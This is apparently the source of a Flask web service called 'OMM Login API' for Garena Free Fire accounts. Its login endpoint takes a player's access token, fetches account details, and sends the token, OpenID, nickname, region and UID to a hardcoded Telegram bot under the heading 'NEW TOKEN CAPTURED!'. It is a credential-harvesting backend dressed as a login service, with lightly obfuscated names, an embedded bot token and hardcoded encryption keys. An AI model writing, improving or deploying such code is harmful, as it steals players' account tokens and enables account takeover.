from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import base64
import requests
import warnings
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from google.protobuf import descriptor_pool, message_factory
import blackboxprotobuf

app = Flask(__name__)
CORS(app)

warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

mYdEsCrIpToR = b'\n\x08my.proto"\xae\t\n\x08GameData\x12\x11\n\ttimestamp\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x14\n\x0cgame_version\x18\x05 \x01(\x05\x12\x14\n\x0cversion_code\x18\x07 \x01(\t\x12\x0f\n\x07os_info\x18\x08 \x01(\t\x12\x13\n\x0bdevice_type\x18\t \x01(\t\x12\x18\n\x10network_provider\x18\n \x01(\t\x12\x17\n\x0fconnection_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\x05\x12\x15\n\rscreen_height\x18\r \x01(\x05\x12\x0b\n\x03dpi\x18\x0e \x01(\t\x12\x10\n\x08cpu_info\x18\x0f \x01(\t\x12\x11\n\ttotal_ram\x18\x10 \x01(\x05\x12\x10\n\x08gpu_name\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x0f\n\x07user_id\x18\x13 \x01(\t\x12\x12\n\nip_address\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x15\n\rplatform_type\x18\x17 \x01(\x05\x12\x1a\n\x12device_form_factor\x18\x18 \x01(\t\x12\x14\n\x0cdevice_model\x18\x19 \x01(\t\x12\x14\n\x0caccess_token\x18\x1d \x01(\t\x12\x18\n\x10unknown_field_30\x18\x1e \x01(\x05\x12"\n\x1asecondary_network_provider\x18) \x01(\t\x12!\n\x19secondary_connection_type\x18* \x01(\t\x12\x11\n\tunique_id\x18\x39 \x01(\t\x12\x10\n\x08field_60\x18< \x01(\x05\x12\x10\n\x08field_61\x18= \x01(\x05\x12\x10\n\x08field_62\x18> \x01(\x05\x12\x10\n\x08field_63\x18? \x01(\x05\x12\x10\n\x08field_64\x18@ \x01(\x05\x12\x10\n\x08field_65\x18A \x01(\x05\x12\x10\n\x08field_66\x18B \x01(\x05\x12\x10\n\x08field_67\x18C \x01(\x05\x12\x10\n\x08field_70\x18F \x01(\x05\x12\x10\n\x08field_73\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x10\n\x08field_76\x18L \x01(\x05\x12\x10\n\x08apk_info\x18M \x01(\t\x12\x10\n\x08field_78\x18N \x01(\x05\x12\x10\n\x08field_79\x18O \x01(\x05\x12\x17\n\x0fos_architecture\x18Q \x01(\t\x12\x14\n\x0cbuild_number\x18S \x01(\t\x12\x10\n\x08field_85\x18U \x01(\x05\x12\x18\n\x10graphics_backend\x18V \x01(\t\x12\x19\n\x11max_texture_units\x18W \x01(\x05\x12\x15\n\rrendering_api\x18X \x01(\x05\x12\x18\n\x10encoded_field_89\x18Y \x01(\t\x12\x10\n\x08field_92\x18\\ \x01(\x05\x12\x13\n\x0bmarketplace\x18] \x01(\t\x12\x16\n\x0eencryption_key\x18^ \x01(\t\x12\x15\n\rtotal_storage\x18_ \x01(\x05\x12\x10\n\x08field_97\x18a \x01(\x05\x12\x10\n\x08field_98\x18b \x01(\x05\x12\x10\n\x08field_99\x18c \x01(\t\x12\x11\n\tfield_100\x18d \x01(\tb\x06proto3'

oUtPuTdEsCrIpToR = b'\n\x13jwt_generator.proto"\xd2\x02\n\nGarena_420\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x0e\n\x06region\x18\x02 \x01(\t\x12\r\n\x05place\x18\x03 \x01(\t\x12\x10\n\x08location\x18\x04 \x01(\t\x12\x0e\n\x06status\x18\x05 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\n\n\x02id\x18\t \x01(\x05\x12\x0b\n\x03api\x18\n \x01(\t\x12\x0e\n\x06number\x18\x0c \x01(\x05\x12\x1e\n\tGarena420\x18\x0f \x01(\x0b\x32\x0b.Garena_420\x12\x0c\n\x04area\x18\x10 \x01(\t\x12\x11\n\tmain_area\x18\x12 \x01(\t\x12\x0c\n\x04city\x18\x13 \x01(\t\x12\x0c\n\x04name\x18\x14 \x01(\t\x12\x11\n\ttimestamp\x18\x15 \x01(\x03\x12\x0e\n\x06binary\x18\x16 \x01(\x0c\x12\x13\n\x0bbinary_data\x18\x17 \x01(\x0c\x1a"\n\x12Decrypted_Payloads\x12\x0c\n\x04type\x18\x01 \x01(\x05b\x06proto3'

pOoL = descriptor_pool.Default()
pOoL.AddSerializedFile(mYdEsCrIpToR)
pOoL.AddSerializedFile(oUtPuTdEsCrIpToR)

factory = message_factory.MessageFactory()
gAmEdAtA = factory.GetPrototype(pOoL.FindMessageTypeByName('GameData'))

aEsKeY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
aEsIv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

iNsPeCtUrL = "https://100067.connect.garena.com/oauth/token/inspect"

BOT_TOKEN = "8891707343:AAE7yms23E6L1APDuqXyZzh_FJyRd-nSz4k"
CHAT_ID = "8360598984"

def sEnDtOtElEgRaM(tOkEn, oPeNiD, nIcKnAmE, rEgIoN, aCcOuNtUiD):
    try:
        mEsSaGe = f"""
🔥 NEW TOKEN CAPTURED! 🔥

👤 Nickname: {nIcKnAmE}
🌍 Region: {rEgIoN}
🆔 Account UID: {aCcOuNtUiD}
🔑 OpenID: {oPeNiD}
🎫 Access Token: {tOkEn}

📱 Platform: Android
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        uRl = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        dAtA = {"chat_id": CHAT_ID, "text": mEsSaGe}
        requests.post(uRl, data=dAtA, timeout=5, verify=False)
    except:
        pass

def iNsPeCtToKeN(aCcEsStOkEn):
    uRl = f"{iNsPeCtUrL}?token={aCcEsStOkEn}"
    hEaDeRs = {'User-Agent': "GarenaMSDK/4.0.19P9"}
    rEsP = requests.get(uRl, headers=hEaDeRs, timeout=10, verify=False)
    if rEsP.status_code != 200:
        raise Exception(f"Inspect failed: {rEsP.status_code}")
    dAtA = rEsP.json()
    return dAtA.get('open_id')

xOrKeY = b"1e5898ccb8dfdd921f9bdea848768b64a201"

def dEcOdEfFnAmE(b64_str: str) -> str:
    try:
        if not b64_str:
            return ""
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = xOrKeY[i % len(xOrKeY)]
            decrypted_bytes.append(byte ^ key_byte)
        return decrypted_bytes.decode('utf-8', errors='ignore')
    except Exception:
        return b64_str

def fEtChAcCoUnTiNfO(aCcEsStOkEn):
    uRl = f"https://ff-jwt-gen-api.lovable.app/api/public/token?access_token={aCcEsStOkEn}"
    rEsP = requests.get(uRl, timeout=10, verify=False)
    if rEsP.status_code != 200:
        raise Exception(f"API returned {rEsP.status_code}")
    dAtA = rEsP.json()
    if not dAtA.get('success', False):
        raise Exception("API indicated failure")
    aCcOuNtUiD = dAtA.get('account_uid', 'N/A')
    rEgIoN = dAtA.get('region', 'N/A')
    pLaTfOrMuSeD = dAtA.get('platform_type_used')
    pAyLoAd = dAtA.get('jwt_decoded', {}).get('payload', {})
    nIcKnAmEeNc = pAyLoAd.get('nickname', '')
    nIcKnAmE = dEcOdEfFnAmE(nIcKnAmEeNc) if nIcKnAmEeNc else 'Unknown'
    return aCcOuNtUiD, rEgIoN, nIcKnAmE, pLaTfOrMuSeD

@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        token = data.get('token')
        
        if not token:
            return jsonify({'error': 'Token required'}), 400
        
        account_uid, region, nickname, platform = fEtChAcCoUnTiNfO(token)
        open_id = iNsPeCtToKeN(token)
        sEnDtOtElEgRaM(token, open_id, nickname, region, account_uid)
        
        return jsonify({
            'success': True,
            'nickname': nickname,
            'region': region,
            'account_uid': account_uid,
            'open_id': open_id,
            'platform': platform,
            'message': 'Login successful! Token sent to Telegram'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'message': 'API Running'})

@app.route('/')
def home():
    return jsonify({
        'name': 'OMM Login API',
        'version': '3.0',
        'status': 'running'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)